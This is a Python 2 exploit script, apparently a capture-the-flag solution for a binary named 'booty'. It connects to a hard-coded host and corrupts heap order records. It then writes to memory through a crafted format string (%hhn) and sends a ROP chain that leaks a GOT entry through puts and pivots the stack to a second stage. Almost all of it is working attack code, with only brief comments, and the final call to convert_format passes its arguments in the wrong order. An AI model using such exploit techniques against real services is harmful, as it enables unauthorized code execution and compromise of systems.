__author__ = 'HuyNA'
import socket, time
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def recv_until_print(sock, delim):
    buf = ""
    while True:
        c = sock.recv(30)       # chuan them vao moi in flag do dong bo
        print(c),
        buf += c
        if delim in buf:
            break
    return buf

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()

def convert_format(rop_array_number, format):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack(format, rop_array_number[i])
    return rop

def send(s, m):
    print "[SEND]", m
    s.send(m)

def recv(s):
    t = s.recv(4096)
    print "[RECV]", t
    return t

#socat TCP-LISTEN:9446,reuseaddr,fork EXEC:./booty
# nc 149.13.33.84 1519
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("149.13.33.84", 1519))
s.connect(("192.168.19.26",1519))

raw_input('aaaaaaa ... ')

address_string = 'e'*8 + pq(0x06013D8)+pq(0x06013D9)+pq(0x06013Da)+pq(0x06011B8)+pq(0x06011B9)+pq(0x06011Ba)
address_string = address_string + 'd'*(0x80-len(address_string))

value1 = pi(0x00400AF0)[0:3]
value2 = pi(0x00400d10)[0:3]

a = 0x20


format_string1 = '%1$'+str(0xf0 - a)+'x%8$hhn' \
                +'%1$'+str(0x10a - 0xf0)+'x%9$hhn'\
                +'%1$'+str(0x40 - 0x0a)+'x%10$hhn'

format_string2 = '%1$'+str(0x110 - 0x40)+'x%11$hhn' \
                +'%1$'+str(0x10d - 0x10)+'x%12$hhn'\
                +'%1$'+str(0x40 - 0x0d)+'x%13$hhn'

format_string = 'b'*0x20 + format_string1 + format_string2
format_string += 'c'*(0x150-len(format_string))
format_string = format_string + pq(0x150) + pq(0x90)

order1 = 'a'*0x80 + pq(0) + pq(0x150) + format_string

order2 = 'b'*0x150


#print recv_until(s, 'Submit\n')
buf = ''

# delete order 2
print recv_until(s, 'Submit\n')
s.send('4\n')
buf += '4\n'

# patch header of order 2
print recv_until(s, 'Submit')
s.send('1\n')
buf += '1\n'
print recv_until(s, 'Enter first order:\n')
s.send(order1 + '\n')
buf += order1 + '\n'

# spray address used in format string
print recv_until(s, 'Submit')
s.send(address_string + '\n')
buf += address_string + '\n'

# submit to realloc to order 2
print recv_until(s, 'Submit\n')
s.send('5\n')
buf += '5\n'

puts_address = 0x004006D0
got_address = 0x06013B8
pop_edi_ret = 0x0400d13 #: pop rdi ; ret  ;
ret = 0x0400CAD

get_address = 0x00400876 #
pop_rsp = 0x00400d0d #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)

rop_stage2_address = 0x601c00

rop = [
    pop_edi_ret,
    got_address,
    ret,
    puts_address,

    pop_edi_ret,
    rop_stage2_address,
    ret,
    get_address,

    pop_rsp
]
rop = convert_format('<Q', rop)

s.send(rop+'\n')
buf += rop+'\n'

write_file('a', buf)